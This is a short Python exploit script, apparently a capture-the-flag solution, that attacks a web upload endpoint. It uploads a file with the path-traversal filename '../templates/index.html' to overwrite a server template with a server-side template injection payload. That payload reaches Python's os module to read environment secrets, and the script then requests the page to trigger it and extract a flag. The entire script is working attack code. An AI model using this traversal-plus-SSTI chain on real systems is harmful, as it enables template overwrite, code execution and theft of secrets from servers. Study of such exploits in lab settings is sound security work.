import sys
import re
import urllib.request
import urllib.parse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    # We will upload a file named "../templates/index.html" to overwrite the template
    # Inside it, we place an SSTI payload
    payload_content = "{{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}"
    
    # Boundary for multipart form data
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"../templates/index.html\"\r\n"
        f"Content-Type: text/html\r\n\r\n"
        f"{payload_content}\r\n"
        f"--{boundary}--\r\n"
    )
    
    req = urllib.request.Request(target, data=body.encode('utf-8'), method='POST')
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
    
    try:
        # Step 1: Upload the malicious file
        print("[*] Uploading malicious template...")
        urllib.request.urlopen(req)
        
        # Step 2: Trigger the SSTI by revisiting the index page
        print("[*] Triggering payload...")
        req2 = urllib.request.Request(target, method='GET')
        with urllib.request.urlopen(req2) as response:
            html = response.read().decode('utf-8')
            flag_match = re.search(r"flag\{[a-zA-Z0-9_\-]+\}", html)
            if flag_match:
                print(f"[+] Exploit successful! Flag: {flag_match.group(0)}")
                sys.exit(0)
            print("[-] Target page loaded but no flag found.")
            sys.exit(1)
            
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
